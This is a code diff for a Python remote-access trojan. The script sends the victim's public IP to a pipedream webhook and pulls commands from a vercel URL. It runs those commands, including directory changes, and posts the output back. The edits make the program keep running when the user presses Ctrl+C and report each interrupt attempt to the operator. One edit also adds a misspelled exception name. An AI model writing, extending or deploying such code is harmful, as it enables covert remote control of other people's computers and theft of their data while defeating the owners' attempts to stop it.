@@ -10,7 +10,10 @@ try:
     ip = get('https://api.ipify.org').content.decode('utf8')
     post("https://eo482aoknyxae8c.m.pipedream.net", data=f"New client IP: `{ip}`")
 except KeyboardInterrupt:
-    post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C) when init``")
+    try:
+        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C) when init``")
+    except KeyboardInterrupt:
+        pass
     pass
 
 while True:
@@ -19,20 +22,23 @@ while True:
         #get HTML
         try:
             command = get("https://discord-bot-command-inputter-littleblack111.vercel.app").content.decode()
-            if "error" in command.lower():
-                sleep(5)
-                continue
+            if command.startswith('Error: 429 - {"message": "You are being rate limited.", "retry_after":'):
+                try:
+                    sleep(5)
+                    continue
+                except KeyboardInterrupt:
+                    post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C) when waiting discord api timeout(rate-limit)``")
         except KeyboardInterrupt:
-            post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C) with sleeping(cuz of discord api timeout)``")
+            post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C) when handling discord api``")
             continue
         except:
             print("Failed to connect to server")
-            sleep(1)
+            sleep(3)
             continue
             # execute command
         if old_command != command:
             try:
-                if command.startwith("ping"):
+                if command.startswith("ping"):
                     try:
                         post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: Pong!")
                     except KeyboardInterrupt:
@@ -40,12 +46,15 @@ while True:
                     except:
                         print("Failed to connect to server")
                         continue
-                if command.startwith("cd"):
+                if command.startswith("cd"):
                     dir=command.replace('cd', '')
                     try:
                         chdir(dir)
                     except KeyboardInterrupt:
-                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C) while changing directory``")
+                        try:
+                            post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C) while changing directory``")
+                        except KeyboardInterrupt:
+                            continue
                         continue
                     except FileNotFoundError:
                         post("https://eo482aoknyxae8c.m.pipedream.net", data=f"``$ {command}`` ```No Such Directory```-{ip}")
@@ -58,7 +67,10 @@ while True:
                     try:
                         post("https://eo482aoknyxae8c.m.pipedream.net", data=f"``$ {command}`` ```{cmdout}```-{ip}")
                     except KeyboardInterrupt:
-                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C) when trying to post output``")
+                        try:
+                            post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C) when trying to post output``")
+                        except KeyboardInterrupt:
+                                continue
                         continue
                     except:
                         print("Failed to sent output")
@@ -70,8 +82,14 @@ while True:
         try:
             sleep(0.1)
         except KeyboardInterrupt:
-            post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C)``")
+            try:
+                post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C)``")
+            except KeyboardInterrupt:
+                continue
             continue
     except KeyboardInterrupt:
-        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C)``")
+        try:
+            post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C)``")
+        except KeyyboardInerrupt:
+            continue
         continue
